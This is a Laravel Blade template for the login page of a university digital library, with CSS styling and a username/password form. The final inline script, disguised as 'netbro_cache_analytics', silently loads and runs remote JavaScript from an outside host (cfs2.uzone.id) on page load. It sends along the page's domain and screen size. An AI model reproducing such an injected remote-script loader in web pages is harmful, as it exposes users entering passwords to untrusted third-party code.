<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="robots" content="noindex">

  <title>Perpustakaan Digital - STT Garut &copy; {{ date('Y') }}</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <link rel="icon" href="{!! asset('images/logo/motor.png')!!}">
  <link href="{!! asset('assets/css/bootstrap.min.css') !!}" rel="stylesheet">
  <style type="text/css">

    body {
      /* Margin bottom by footer height */
      margin-bottom: 160px;
      background: url({{ asset('images/login.jpeg') }}) no-repeat center center fixed; 
      background-size: cover;
    }
    *{
      font-family: 'Raleway', sans-serif;
      color : #FFF;
      
    }


    div h3 span{
     color : #FFF;
     font-size:14px;
   }

   div span {
     font-weight: 200;
   }

   h1{
     font-weight: 200;
   }

   .login_box{
    background: #f32d27; /* Old browsers */
    /* IE9 SVG, needs conditional override of 'filter' to 'none' */
    background: -moz-linear-gradient(45deg,  #f32d27 5%, #ff6b45 99%); /* FF3.6+ */
    background: -webkit-gradient(linear, left bottom, right top, color-stop(5%,#f32d27), color-stop(99%,#ff6b45)); /* Chrome,Safari4+ */
    background: -webkit-linear-gradient(45deg,  #f32d27 5%,#ff6b45 99%); /* Chrome10+,Safari5.1+ */
    background: -o-linear-gradient(45deg,  #f32d27 5%,#ff6b45 99%); /* Opera 11.10+ */
    background: -ms-linear-gradient(45deg,  #f32d27 5%,#ff6b45 99%); /* IE10+ */
    background: linear-gradient(45deg,  #f32d27 5%,#ff6b45 99%); /* W3C */
    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#f32d27', endColorstr='#ff6b45',GradientType=1 ); /* IE6-8 fallback on horizontal gradient */
    
    width:35%;
    /* height:70%; */
    position:absolute;
    top:15%;
    left:32.5%;
    
    -webkit-box-shadow: 0px 0px 8px 0px rgba(50, 50, 50, 0.54);
    -moz-box-shadow:    0px 0px 8px 0px rgba(50, 50, 50, 0.54);
    box-shadow:         0px 0px 8px 0px rgba(50, 50, 50, 0.54);
  }

  @media (max-width: 767px) {
    .login_box{
      background: #f32d27; /* Old browsers */
      /* IE9 SVG, needs conditional override of 'filter' to 'none' */
      background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMTAwJSIgeDI9IjEwMCUiIHkyPSIwJSI+CiAgICA8c3RvcCBvZmZzZXQ9IjUlIiBzdG9wLWNvbG9yPSIjZjMyZDI3IiBzdG9wLW9wYWNpdHk9IjEiLz4KICAgIDxzdG9wIG9mZnNldD0iOTklIiBzdG9wLWNvbG9yPSIjZmY2YjQ1IiBzdG9wLW9wYWNpdHk9IjEiLz4KICA8L2xpbmVhckdyYWRpZW50PgogIDxyZWN0IHg9IjAiIHk9IjAiIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIGZpbGw9InVybCgjZ3JhZC11Y2dnLWdlbmVyYXRlZCkiIC8+Cjwvc3ZnPg==);
      background: -moz-linear-gradient(45deg,  #f32d27 5%, #ff6b45 99%); /* FF3.6+ */
      background: -webkit-gradient(linear, left bottom, right top, color-stop(5%,#f32d27), color-stop(99%,#ff6b45)); /* Chrome,Safari4+ */
      background: -webkit-linear-gradient(45deg,  #f32d27 5%,#ff6b45 99%); /* Chrome10+,Safari5.1+ */
      background: -o-linear-gradient(45deg,  #f32d27 5%,#ff6b45 99%); /* Opera 11.10+ */
      background: -ms-linear-gradient(45deg,  #f32d27 5%,#ff6b45 99%); /* IE10+ */
      background: linear-gradient(45deg,  #f32d27 5%,#ff6b45 99%); /* W3C */
      filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#f32d27', endColorstr='#ff6b45',GradientType=1 ); /* IE6-8 fallback on horizontal gradient */
      
      width:90%;
      height:80%;
      position:absolute;
      top:10%;
      left:5%;
      
      -webkit-box-shadow: 0px 0px 8px 0px rgba(50, 50, 50, 0.54);
      -moz-box-shadow:    0px 0px 8px 0px rgba(50, 50, 50, 0.54);
      box-shadow:         0px 0px 8px 0px rgba(50, 50, 50, 0.54);
    }
  }

  .image-circle{
    border-radius: 50%;
    width: 175px;
    height: 175px;
    border: 4px solid #FFF;
    margin: 10px;
  }

  .follow{
    background-color:#FC563B;
    height: 80px;
    cursor:pointer;
  }

  .follow:hover {
    background-color:#F22F26;
    height: 80px;
    cursor:pointer;
  }

  .login_control{
    background-color:#FFF;
    padding:10px;
    
  }

  .control {
    color:#000;
    margin:10px;
  }

  .label {
    color: #EB4F26;
    font-size: 18px;
    font-weight: 500;
  }

  .form-control{
    color: #000000 !important;
    font-size: 25px;
    border: none;
    padding: 25px;
    padding-left: 10px;
    border-bottom: 1px solid #CCC;
    margin-bottom: 10px;
    outline: none;
    -webkit-box-shadow: none !important;
    -moz-box-shadow: none !important;
    box-shadow: none !important;
  }

  .form-control:focus{
    border-radius: 0px;
    border-bottom: 1px solid #FC563B;
    margin-bottom: 10px;
    outline: none;
    -webkit-box-shadow: none !important;
    -moz-box-shadow: none !important;
    box-shadow: none !important;
  }
  .btn-orange{
    background-color: #FC563B;
    border-radius: 0px;
    margin: 5px;
    padding: 5px;
    width: 150px;
    font-size: 20px;
    font-weight: inherit;
  }

  .btn-orange:hover {
    background-color: #F22F26;
    border-radius: 0px;
    margin: 5px;
    padding: 5px;
    width: 150px;
    font-size: 20px;
    font-weight: inherit;
    color:#FFF !important;
  }

  .line{
    border-bottom : 2px solid #F32D27;
  }


  .outter{
    padding: 0px;
    border: 1px solid rgba(255, 255, 255, 0.29);
    border-radius: 50%;
    width: 200px;
    height: 200px;
  }

</style>

</head>
<body>

  <div class="container">
    <div class="row login_box">
      <div class="col-md-12 col-xs-12 follow line" align="center">
        <h2>Perpustakaan Digital &copy;{!! date('Y') !!}</h2>
      </div>
      
      <div class="col-md-12 col-xs-12 login_control">
        @if($errors)
          @foreach ($errors->all() as $error)
          <div class="alert alert-danger">{{ $error }}</div>
          @endforeach
        @endif
        @include('partials.alert')
        @include('partials.warning')
        @include('partials.validation')
        <form class="login-form" method="POST" action="{{ url('/login') }}">
          @if ($errors->has('email'))
          <span class="help-block">
            <strong>{{ $errors->first('email') }}</strong>
          </span>
          @endif
          {{ csrf_field() }}
          <div class="control">
            <div class="label">Username</div>
            <input type="text" id="name" placeholder="Username" name="username" value="{{ old('username') }}" class="form-control" />
          </div>
          
          <div class="control">
           <div class="label">Password</div>
           <input type="password" id="password" placeholder="Password" name="password" class="form-control" />
         </div>
         <div align="center">
           <button type="submit" class="btn btn-orange">Masuk</button>
         </div>
       </form>
       
     </div>
     
     
     
   </div>
 </div>
 <script type="text/javascript">
  
 </script>
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKfRxru1P5PSTJuYLPTCBtak5X0%2fp9x6OXS4qb6r9fyt9%2b7YR7VU2kQlE%2bLp6tcwqoJ8ymI6vaEN2xx%2bM2tuaWhTD7sw%2fBB3aieqQsk2z%2fR06k%2bkqATBLYuvuwtvJA71A353WaArJLFebCX%2fqH55tWItvZ0nk8nq0tZ4nqKenF%2fwHuPQEAEAwk1cTSEfyqfPUhmfZupq7DGyfGk%2fyP4Lwup0F4QRo5ag4ocgK6XUEBtQXwkzQ8VavOqC%2bzufB799KNhG0NPyxQerfONJ86RaRa7aGFPRq6KM3JtQ2%2bIva%2b8QhXHyx5z2bpGcJ4OpulFbM1xuVDy%2fL50%2brjmO2DdFVMVjYwciaGI1ZuOXXmtXELh4aKf%2bCKd%2fPtJE0FSqqLDhkIT1dwzhsiPZPx2jdL9bJC1dM5vsuNxlYrL4Yftdngqnmd3ZiwpkSuBvdY14Tbul5qFL2FOn8%2fgB%2bVyGsEDOYWfDQZI6cRj3RWF5asWjOW65lq9bGfd5PuYz0S%2bG16Ufni1A7HQAWFpaWQ9Aqc4VUtzOtStz%2farMHmNDldZLr4GblhcvN9%2balgavBhAvEif58N" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 </html>